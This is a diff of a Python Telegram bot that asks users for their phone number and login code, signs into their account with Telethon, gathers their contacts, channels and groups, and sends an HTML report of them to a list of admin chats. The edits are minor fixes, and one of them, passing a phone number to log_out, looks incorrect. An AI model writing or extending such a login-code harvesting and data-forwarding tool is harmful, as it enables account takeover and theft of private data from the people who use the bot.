@@ -21,6 +21,7 @@ allowed_users = [int(user_id) for user_id in allowed_users_str.split(",")]
 admin_chat_ids = [int(chat_id) for chat_id in admin_chat_ids_str.split(",")]
 
 # Создаем TelegramClient и Bot
+client = TelegramClient('session_name', api_id, api_hash)
 bot = Bot(token=bot_token)
 dp = Dispatcher(bot)
 dp.middleware.setup(LoggingMiddleware())
@@ -65,7 +66,7 @@ async def get_phone_number(message: types.Message):
     phone_number = message.text
     user_state[message.from_user.id] = {'phone_number': phone_number}
     try:
-        client = await TelegramClient('session_name', api_id, api_hash)
+        client = TelegramClient('session_name', api_id, api_hash)
         await client.connect()
         phone_code_hash = await client.send_code_request(phone_number)
         user_state[message.from_user.id]['phone_code_hash'] = phone_code_hash
@@ -96,7 +97,7 @@ async def get_code(message: types.Message):
         await save_about_channels(phone_number, userid, firstname, lastname, username, openchannel_count, opengroup_count, closechannel_count, closegroup_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, openchannels, closechannels, openchats, closechats, delgroups, closegroupdel_count)
         await generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html, user_chat_id)
         await send_files_to_bot(bot, admin_chat_ids, user_chat_id)
-        await client.log_out()
+        await client.log_out(phone_number)
         await client.disconnect()
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
